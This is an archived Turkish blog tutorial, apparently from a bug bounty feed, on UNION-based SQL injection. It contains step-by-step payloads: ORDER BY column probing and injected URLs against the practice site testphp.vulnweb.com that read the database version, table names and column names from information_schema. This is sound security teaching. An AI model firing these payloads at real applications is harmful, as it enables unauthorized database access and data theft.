# UNION Tabanlı SQL Injection

- **Source URL:** https://medium.com/@kenes7667/union-tabanl%C4%B1-sql-injection-bcc023156b64?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250501124633/https://medium.com/@kenes7667/union-tabanl%C4%B1-sql-injection-bcc023156b64
- **Fetched:** 2026-11-21
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/7535 (id 7535)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# UNION Tabanlı SQL Injection

Herkese merhaba bu yazım da sizlere basit düzeyde UNION SQLi tarafını anlatacağım. Hazırsanız başlayalım !

**Ama ilk önce temel UNION bilgisi:**Birden fazla sorgu sonucunu bir araya getirmek için kullanılan genel UNION sözdizimi şu şekildedir:

`SELECT column1, column2 FROM table1 UNION SELECT column1, column2 FROM table2;`
SQL injection, saldırganın web uygulamasındaki SQL sorgularını manipüle etmesine izin verir. UNION tabanlı SQLi’de saldırgan, uygulamanın sorgularını değiştirmek için UNION ifadesini kullanarak başka bir sorgu ekler. Amaç, uygulamaya beklenmedik veri döndürmek veya hassas bilgileri almak olabilir.

## Adım Adım UNION SQLi:

1. **Sütun Sayısını Belirleme:** UNION ile başarılı bir saldırı gerçekleştirmek için her iki sorgunun da aynı sayıda sütuna sahip olması gerekir. Bunun için, genellikle `ORDER BY` ifadesi veya hatalar kullanılarak sorgudaki sütun sayısı tespit edilir:

```
' ORDER BY 1-- 
' ORDER BY 2-- 
' ORDER BY 3-- 
```
Hangi sütun sayısında hata alınırsa, oradaki değer sorgudaki sütun sayısını verir.

**2. Veri Türlerini Belirleme:** UNION komutunun başarılı olabilmesi için sütunların veri türlerinin de uyumlu olması gerekir. Veri türlerini öğrenmek için genellikle `NULL` kullanılır çünkü NULL, her türlü veri türüyle uyumludur:

`http://testphp.vulnweb.com/listproducts.php?cat=1'+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13`
Bu yazılan URL kısmında sütun sayısı hatasını gideriyoruz ve sayfayı incelersek helper fonksiyon çalıştırmayı görüyoruz.

`http://testphp.vulnweb.com/listproducts.php?cat=1'+UNION+SELECT+1,2,3,4,5,6,version(),8,9,10,11,12,13`
Daha temiz bir sayfa da işlemlerimizi yapmak için:

`http://testphp.vulnweb.com/listproducts.php?cat=-999999'+UNION+SELECT+1,2,3,4,5,6,version(),8,9,10,11,12,13`
cat = -999999 kısmını yazmamızdaki amaç bu numaralı id olmayacağını tahmin ederek sayfada bir cevap almıyoruz ama sorgu çalışmış oluyor :)

Şimdi ise daha rahat çalışabileceğimiz bir sayfa oldu. Kaldığımız yerden devam etmek gerekirse en son

`' UNION SELECT 1,2,3,4,5,6,version(),8,9,10,11,12,13`
sorgusunu çalıştırınca karşımızda database versiyonunu görmüş oluyoruz.

Kullanılan veri tabanının tablo ismine , sütunların isimlerine ve veri türleri gibi bilgilerine ulaşmamız için gerekli sorgu :

```
UNION SELECT 1,2,3,4,5,6,table_name,8,9,10,11,12,13 FROM information_schema.tables WHERE table_schema = database;
UNION SELECT 1,2,3,4,5,6,column_name,8,9,10,11,12,13 FROM information_schema.columns WHERE table_name = '{veri tabanı ismi}'
```
Bu şekilde gerekli olan tüm veri tabanı bilgilerine ulaşmış oluyoruz. Umarım açıklayıcı olmuştur. İyi araştırmalar.
